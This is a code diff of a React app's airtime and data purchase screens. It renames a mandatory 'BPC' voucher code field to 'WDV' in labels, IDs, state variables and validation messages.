-                          <label className="text-[10px] font-mono text-slate-400 uppercase tracking-wider font-bold text-rose-500">BPC Voucher Code (MANDATORY)</label>
+                          <label className="text-[10px] font-mono text-slate-400 uppercase tracking-wider font-bold text-rose-500">WDV Voucher Code (MANDATORY)</label>
                           <button
-                            id="btn-goto-buy-bpc-airtime"
+                            id="btn-goto-buy-wdv-airtime"
                             type="button"
-                            onClick={() => setCurrentScreen('buy_bpc')}
+                            onClick={() => setCurrentScreen('buy_wdv')}
                             className="text-[9px] font-bold text-indigo-600 dark:text-teal-400 hover:underline"
                           >
-                            Buy BPC Voucher
+                            Buy WDV Voucher
                           </button>
                         </div>
                         <input
-                          id="input-airtime-bpc"
+                          id="input-airtime-wdv"
                           type="text"
-                          placeholder="Example: BPC-XXXX-XXXX-XXXX"
-                          value={airtimeBpcCode}
-                          onChange={(e) => setAirtimeBpcCode(e.target.value)}
+                          placeholder="Example: WDV-XXXX-XXXX-XXXX"
+                          value={airtimeWdvCode}
+                          onChange={(e) => setAirtimeWdvCode(e.target.value)}
                           className="w-full text-xs bg-white dark:bg-slate-950 border border-slate-200 dark:border-slate-800 rounded-xl px-4 py-2.5 text-slate-800 dark:text-white focus:outline-none focus:ring-1 focus:ring-rose-500 font-mono tracking-widest uppercase"
                         />
-                        {!airtimeBpcCode ? (
+                        {!airtimeWdvCode ? (
                           <div className="mt-1.5 p-2 bg-amber-500/10 border border-amber-500/20 rounded-lg text-[10px] text-amber-600 dark:text-amber-400 leading-normal">
-                            BPC voucher is required. If you don't have one, tap{' '}
+                            WDV voucher is required. If you don't have one, tap{' '}
                             <button
                               type="button"
-                              onClick={() => setCurrentScreen('buy_bpc')}
+                              onClick={() => setCurrentScreen('buy_wdv')}
                               className="font-extrabold underline text-indigo-600 dark:text-teal-400"
                             >
-                              'Buy BPC Voucher'
+                              'Buy WDV Voucher'
                             </button>.
                           </div>
-                        ) : !isVoucherValid(airtimeBpcCode) ? (
+                        ) : !isVoucherValid(airtimeWdvCode) ? (
                           <div className="mt-1.5 p-2 bg-rose-500/10 border border-rose-500/20 rounded-lg text-[10px] text-rose-600 dark:text-rose-400 font-medium">
-                            Invalid BPC voucher.
+                            Invalid WDV voucher.
                           </div>
                         ) : (
                           <div className="mt-1.5 p-2 bg-emerald-500/10 border border-emerald-500/20 rounded-lg text-[10px] text-emerald-600 dark:text-emerald-400 font-medium">
-                            ✓ BPC Voucher code format verified.
+                            ✓ WDV Voucher code format verified.
                           </div>
                         )}
                       </div>
@@ -2909,11 +2909,11 @@ export default function App() {
                           airtimePhone.length < 10 ||
                           !airtimeAmount ||
                           parseInt(airtimeAmount) < 100 ||
-                          !isVoucherValid(airtimeBpcCode) ||
+                          !isVoucherValid(airtimeWdvCode) ||
                           isSubmitting
                         }
                         className={`w-full text-xs font-bold uppercase tracking-widest py-3.5 bg-gradient-to-r from-indigo-600 to-teal-500 hover:from-indigo-700 hover:to-teal-600 text-white rounded-xl shadow-lg shadow-indigo-500/20 active:scale-95 transition-all mt-2 flex items-center justify-center gap-2 ${
-                          (!airtimePhone || airtimePhone.length < 10 || !airtimeAmount || parseInt(airtimeAmount) < 100 || !isVoucherValid(airtimeBpcCode) || isSubmitting) ? 'opacity-50 cursor-not-allowed' : ''
+                          (!airtimePhone || airtimePhone.length < 10 || !airtimeAmount || parseInt(airtimeAmount) < 100 || !isVoucherValid(airtimeWdvCode) || isSubmitting) ? 'opacity-50 cursor-not-allowed' : ''
                         }`}
                       >
                         {isSubmitting ? (
@@ -2952,7 +2952,7 @@ export default function App() {
                       </span>
                     </div>
                     <span className="text-[9px] font-bold text-indigo-600 dark:text-teal-400 bg-indigo-500/10 dark:bg-teal-500/10 px-2.5 py-1 rounded-full border border-indigo-500/10 animate-pulse">
-                      BPC Discount active
+                      WDV Discount active
                     </span>
                   </div>
 
@@ -3116,45 +3116,45 @@ export default function App() {
                         </div>
                       </div>
 
-                      {/* Optional BPC Code input */}
+                      {/* Optional WDV Code input */}
                       <div>
                         <div className="flex items-center justify-between mb-1">
-                          <label className="text-[10px] font-mono text-slate-400 uppercase tracking-wider font-bold text-rose-500">BPC Voucher Code (MANDATORY)</label>
+                          <label className="text-[10px] font-mono text-slate-400 uppercase tracking-wider font-bold text-rose-500">WDV Voucher Code (MANDATORY)</label>
                           <button
-                            id="btn-goto-buy-bpc-data"
+                            id="btn-goto-buy-wdv-data"
                             type="button"
-                            onClick={() => setCurrentScreen('buy_bpc')}
+                            onClick={() => setCurrentScreen('buy_wdv')}
                             className="text-[9px] font-bold text-indigo-600 dark:text-teal-400 hover:underline"
                           >
-                            Buy BPC Voucher
+                            Buy WDV Voucher
                           </button>
                         </div>
                         <input
-                          id="input-data-bpc"
+                          id="input-data-wdv"
                           type="text"
-                          placeholder="Example: BPC-XXXX-XXXX-XXXX"
-                          value={dataBpcCode}
-                          onChange={(e) => setDataBpcCode(e.target.value)}
+                          placeholder="Example: WDV-XXXX-XXXX-XXXX"
+                          value={dataWdvCode}
+                          onChange={(e) => setDataWdvCode(e.target.value)}
                           className="w-full text-xs bg-white dark:bg-slate-950 border border-slate-200 dark:border-slate-800 rounded-xl px-4 py-2.5 text-slate-800 dark:text-white focus:outline-none focus:ring-1 focus:ring-rose-500 font-mono tracking-widest uppercase"
                         />
-                        {!dataBpcCode ? (
+                        {!dataWdvCode ? (
                           <div className="mt-1.5 p-2 bg-amber-500/10 border border-amber-500/20 rounded-lg text-[10px] text-amber-600 dark:text-amber-400 leading-normal">
-                            BPC voucher is required. If you don't have one, tap{' '}
+                            WDV voucher is required. If you don't have one, tap{' '}
                             <button
                               type="button"
-                              onClick={() => setCurrentScreen('buy_bpc')}
+                              onClick={() => setCurrentScreen('buy_wdv')}
                               className="font-extrabold underline text-indigo-600 dark:text-teal-400"
                             >
-                              'Buy BPC Voucher'
+                              'Buy WDV Voucher'
                             </button>.
                           </div>
-) : !isVoucherValid(dataBpcCode) ? (
+) : !isVoucherValid(dataWdvCode) ? (
                           <div className="mt-1.5 p-2 bg-rose-500/10 border border-rose-500/20 rounded-lg text-[10px] text-rose-600 dark:text-rose-400 font-medium">
-                            Invalid BPC voucher.
+                            Invalid WDV voucher.
                           </div>
                         ) : (
                           <div className="mt-1.5 p-2 bg-emerald-500/10 border border-emerald-500/20 rounded-lg text-[10px] text-emerald-600 dark:text-emerald-400 font-medium">
-                            ✓ BPC Voucher code format verified.
+                            ✓ WDV Voucher code format verified.
                           </div>
                         )}
                       </div>
@@ -3166,11 +3166,11 @@ export default function App() {
                           !dataPhone ||
                           dataPhone.length < 10 ||
                           !selectedDataPlan ||
-                          !isVoucherValid(dataBpcCode) ||
+                          !isVoucherValid(dataWdvCode) ||
                           isSubmitting
                         }
                         className={`w-full text-xs font-extrabold uppercase tracking-widest py-3.5 bg-gradient-to-r from-indigo-600 to-teal-500 hover:from-indigo-700 hover:to-teal-600 text-white rounded-xl shadow-lg shadow-indigo-500/20 active:scale-95 transition-all mt-2 flex items-center justify-center gap-2 ${
-                          (!dataPhone || dataPhone.length < 10 || !selectedDataPlan || !isVoucherValid(dataBpcCode) || isSubmitting) ? 'opacity-50 cursor-not-allowed' : ''
+                          (!dataPhone || dataPhone.length < 10 || !selectedDataPlan || !isVoucherValid(dataWdvCode) || isSubmitting) ? 'opacity-50 cursor-not-allowed' : ''
                         }`}
                       >
                         {isSubmitting ? (
